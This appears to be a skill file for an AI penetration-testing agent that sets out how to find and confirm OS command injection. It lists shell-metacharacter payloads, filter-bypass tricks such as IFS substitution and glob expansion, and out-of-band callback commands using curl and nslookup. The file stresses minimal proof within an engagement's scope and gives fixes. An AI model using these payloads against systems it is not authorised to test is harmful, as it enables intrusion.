---
name: OS Command Injection
description: Get a parameter that reaches a shell/subprocess call to execute arbitrary commands - argument injection, shell metacharacter injection, and blind command injection confirmed via timing or out-of-band callback when there's no visible output channel at all. Use on any feature that plausibly shells out server-side - file conversion, ping/traceroute/DNS-lookup utilities, image/PDF processing, "export to" features, filename-based operations.
---

# OS Command Injection

## Where to look
Anything that visibly wraps a system utility is the obvious case (a "ping this host" or "run a traceroute" admin feature), but the more common real-world case is a parameter that's quietly interpolated into a shell call behind an innocuous-looking feature: filename handling passed to an image/video converter, a report-generation tool invoked as a subprocess, an archive/compression step, a filename or path later used in a shell command for cleanup/processing. Ask what *looks* like it would be implemented by shelling out to an existing CLI tool rather than reimplementing that tool's logic - that's the candidate set.

## Detection, in order of signal strength
1. **Direct output-based**: inject a command whose output you'd recognize appearing in the response (`; id`, `| whoami`, `` `id` ``, `$(id)`) - if the app's own output includes something like a uid/username that wasn't there before, you have unauthenticated confirmation in one request.
2. **Timing-based blind**: no visible output changes anything, but `; sleep 10` (or `timeout 10` / `ping -c 10 127.0.0.1` on targets without `sleep`) adds a measurable delay to the response - compare against a baseline request with an inert version of the same input to rule out normal processing-time variance.
3. **Out-of-band blind**: no timing signal either (async processing, a response sent before the command even runs) - inject a payload that makes the target resolve a DNS name or fetch a URL you control (`; nslookup <id>.yourhost.oast`, `` `curl http://<id>.yourhost.oast` ``) and watch for the callback via `interactsh` or nuclei's `-oast` mode. This is the only reliable signal when the injection point is fire-and-forget.

## Metacharacters and chaining
Don't stop at one injection operator - different shells and different sanitization gaps respond to different ones:
```
; id
| id
|| id
&& id
`id`
$(id)
%0a id          (newline, when the input lands in a context that splits on it)
```
If a semicolon/pipe is stripped but backticks or `$()` aren't (or vice versa), that tells you exactly which characters the filter blocks - which usually means the rest are unfiltered, not that injection is impossible.

## Filter-bypass tricks when direct metacharacters are blocked
- **IFS substitution**: if spaces are stripped or blocked, `${IFS}` (or `$IFS$9` as a non-destructive variant) stands in for a space in many shells.
- **Wildcard/glob expansion**: `/usr/bin/w?oami` or `/usr/bin/wh*i` can execute a binary without ever typing its literal name, defeating a keyword blocklist that matches on the command name.
- **Case and encoding**: URL-encoding the metacharacter (`%3b` for `;`) if the filter runs before decoding; mixed-case for keyword blocklists that aren't case-insensitive.
- **Null byte / string truncation** on older/unsanitized stacks: a null byte can terminate the string the validator checks while the full string still reaches the shell.
- **Backtick vs `$()`**: filters tuned for one often miss the other entirely - always try both independently of which one you expect to work.

## Confirming impact, minimally
A single unambiguous proof - a `whoami`/`id` output, or a timing delta that reproduces consistently across repeated requests (rule out network jitter with 3+ trials), or one OOB callback - is sufficient. Don't chain into further exploitation (reverse shell, file writes, lateral movement) beyond what's needed to prove the primitive, unless the engagement scope explicitly calls for deeper validation.

## Tools
- `http` for sending payloads full of shell metacharacters without the shell/curl layer re-interpreting them on your own side first (see the `shell` tool's own description for why nesting an interpreter inside itself corrupts quoting - the same risk applies to crafting injection payloads through a local shell before they even reach the target)
- `interactsh` / nuclei's OOB mode for blind confirmation with no output or timing channel
- `ffuf` to discover which parameter is the vulnerable one when a feature takes several inputs and only one reaches the shell

## Reporting
State the exact parameter, exact payload, and exact confirmation method (output/timing/OOB), plus which metacharacters were filtered versus which worked - that distinction is what tells the fix (the right fix is never a better blocklist; it's avoiding the shell entirely via an argv-array API, or strict allowlisting of the input).
